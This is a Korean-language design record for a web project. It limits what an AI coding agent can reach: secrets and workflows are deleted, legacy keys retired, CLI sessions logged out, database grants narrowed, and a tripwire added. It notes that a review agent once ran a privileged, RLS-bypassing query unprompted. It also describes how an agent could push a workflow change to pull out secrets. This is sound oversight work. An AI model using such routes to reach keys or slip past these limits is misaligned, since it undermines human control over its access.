공통 원인은 *접근 경로 = 읽기 경로* 다 — 빌드·러너의 env 는 push 한 줄로 찍힌다. 그래서 사용자 요구("Claude 는 민감정보를 알아선 안 된다", 2026-09-22)는 "값을 숨긴다" 가 아니라
**"만료 없는 우회 키를 에이전트가 트리거할 수 있는 경로에 두지 않는다"** 로만 채워진다. v5 가 그 마지막 조각(Actions)을 뺐다.

**닫힘(2026-09-22)**:
- #1 옛 `.env.local`·`.vercel/.env.production.local` 의 service_role 평문 — 둘 다 없는 것 확인(`ls -la .env* .vercel/`). 파일 잔존은 트립와이어가 잡지 못한다(`data:*` 는 env 파일을 읽지 않는다, 결정 6) —
  셸 env(export)에 남은 것만 쓰기 스크립트가 멈추고 `data:pull` 이 경고한다.
- #3 Vercel env 의 `SUPABASE_JWT_SECRET`·`SUPABASE_SECRET_KEY`·`POSTGRES_PASSWORD`·`SUPABASE_SERVICE_ROLE_KEY` — 마켓플레이스 연동 해제 + env 0개 + legacy secret 퇴역
  (서명키 시스템으로 이전, legacy `anon`·`service_role` 비활성) → 프로덕션이 `publishable(anon)` 으로 86·15 실측.
- Actions 경로(v4 의 보류 (a)(c)) — 워크플로 삭제. 코드는 GitHub Secrets 를 아무것도 읽지 않는다. 남아 있던 시크릿은 Claude 가 `gh secret list` 로 보고 **전부 지웠다**(이름만 다루므로 Claude 가 해도 된다) —
  todo 기록은 2개, `SUPABASE_SERVICE_ROLE_KEY`(legacy 퇴역으로 이미 죽은 값)·`SUPABASE_URL`(공개값). 정본은 `gh secret list`. 2026-09-22 (5) 둘 다 지워 `gh secret list` 빈 결과 — **0개**.
- #2 `supabase` CLI PAT + 저장된 DB 비밀번호(`db query --linked` 가 postgres, RLS 우회 — 리뷰 에이전트가 프롬프트 없이 실행했었다) — 휴지 = 로그아웃 확인(2026-09-22).
  스키마 작업(`db push`·`operators` insert) 때만 사용자가 `pnpm exec supabase login` 을 열고 끝나면 닫는다. (b) 의 `db push` 가 그렇게 열고 닫은 마지막이다(2026-09-22 (6)).

**남은 것 — 전부 로그인 상태 자체**(값이 아니라 CLI 세션이고, 사용자 터미널에서 잠근다. 끝나야 "에이전트가 쥔 키 0 · 관리자 없이는 작동 불가" 가 사실이 된다):

| # | 경로 | 실측 | 닫는 방법(사용자) |
|---|---|---|---|
| 4 | 레포 admin `gh` 계정 + 암호구 없는 SSH 키 → 에이전트가 push 할 수 있다(Free private 레포는 브랜치·환경 보호 불가) | `gh auth status`·`ssh -T` | `gh auth logout -u hoiya-woohyun`(휴지), SSH 키 암호구 + `ssh-add -t 8h`. v4 의 위협(워크플로 수정 push → `workflow_dispatch` 로 Secrets 회수)은 워크플로가 사라지고 남은 시크릿은 죽은 값 2개뿐이라 **읽을 것이 없다** — 남는 건 push 가 Vercel 빌드를 돌린다는 사실뿐이고 그 빌드는 anon |
| 5 | `vercel` CLI 토큰(무만료) — 배포·env 변경 | `vercel whoami` | 휴지 상태 `vercel logout`, 배포 확인 때만 로그인 |

## 보류였던 것 — v5 에서 닫힘

v4 가 "다음 결정" 으로 남긴 셋. 새 ADR 을 만들지 않고 여기서 닫는다 — 같은 원칙("만료 없는 키를 에이전트가 트리거할 수 있는 경로에 두지 않는다")의 적용이라서.

- **(a) GitHub Actions 의 service_role 을 봇 운영자 로그인(`signInWithPassword`, RLS 안)으로** — **기각.** RLS 안으로 들어오긴 해도 봇의 이메일·비밀번호가 GitHub Secrets 에
  남는다. "GitHub 에 시크릿이 남는 경로" 라는 점에서 service 키와 구조가 같다("왜 이것인가").
- **(b) anon·authenticated 의 기본 GRANT 회수 · `for all` → select/insert/update** — `supabase/migrations/20260922120000_narrow_grants.sql` 로 **구현 · 원격 적용 · 실측 완료(2026-09-22 (6))**: anon = places 86·items 15 select 만(blog_posts·candidates·operators select, delete·insert, `rpc is_operator` 전부 42501) · 운영자 세션 = 5 테이블 select(operators 는 자기 행 1) · delete → 42501 · insert 는 grant·정책을 지나 not-null(23502)에서 멈춤 · `data:apply --dry-run` 반영 0건 exit 0 · `CLAUDECODE=1 data:collect` 거부 문구 실측.
  순서: 여섯 테이블의 anon·authenticated ALL 회수 → anon 은 `places`·`items` select 만 → authenticated 는 5 테이블 select/insert/update + `operators` select(`is_operator()` 가 invoker 라
  호출자 권한으로 읽는다 — 이 grant 가 없으면 운영자의 모든 쿼리가 정책 평가에서 42501) → `alter default privileges for role postgres in schema public revoke all on tables from anon, authenticated`
  (`postgres` 가 만드는 앞으로의 테이블도 — 마이그레이션은 postgres 로 도니 걸리고, 다른 역할이 만든 테이블엔 안 걸린다) → `operators_all` 을 `operators_select`/`_insert`/`_update` 3정책 ×5 테이블로(upsert 는 insert `with check` 와 update `using`+`with check` 둘 다 지난다 —
  seed 의 `on conflict do update` 와 collect·apply 의 `do nothing` 이 다르다) → `is_operator()` execute 를 anon·PUBLIC 에서 회수하고 authenticated 에 **명시** grant(anon 만 빼면 PUBLIC 경유로
  그대로 실행되고, PUBLIC 을 걷으면 authenticated 의 기본 execute 도 함께 사라질 수 있다 — 그러면 운영자의 모든 쿼리가 "permission denied for function is_operator" 로 죽고 `pnpm test` 로는
  안 보인다). `operators_read_self`·anon 정책 둘은 손대지 않는다. service_role 은 어느 문장에도 없다. 시퀀스 grant 는 없다(키가 전부 text/uuid). `drop policy` 는 `if exists` 없이 —
  이름이 다른 곳에서 바뀌었으면 push 가 실패해 알아채게.
  **검증 기록**(`pnpm test` 는 정책·grant 실수를 못 잡아 PostgREST 로만 확인된다): 사용자 `pnpm exec supabase login` → `pnpm exec supabase db push` → 사용자 `pnpm data:login`
  → `pnpm data:apply --dry-run` = `반영 0건` exit 0 → 세션으로 delete 시도 → 42501(이제 정책이 아니라 DELETE grant 부재로 막힘) → anon `pnpm data:pull` 86·15 → 사용자 `pnpm exec supabase logout`. **여기까지 전부 통과했다.**
  **열린 항목은 하나** — push 뒤 어드바이저에 새 경고가 없는지. CLI(`db advisors --linked`)로는 볼 수 없어 사용자가 대시보드에서 한 번 본다. 그것만 확인되면 (b) 는 완전히 닫힌다. push 직후 운영자 세션의 첫 select 가 "permission denied for function is_operator" 나 "permission denied for table operators" 면
  정책 버그가 아니라 grant 가 안 붙은 것이다. (실측에선 그 증상이 없었다 — 운영자 세션의 첫 select 가 곧바로 86 행.)
- **(c) Actions 자체가 "관리자 없이" 도는 구조** — **폐지**(이 v5). 수집·분석·반영은 사용자 터미널의 로컬 세션에서만. 결정 5.
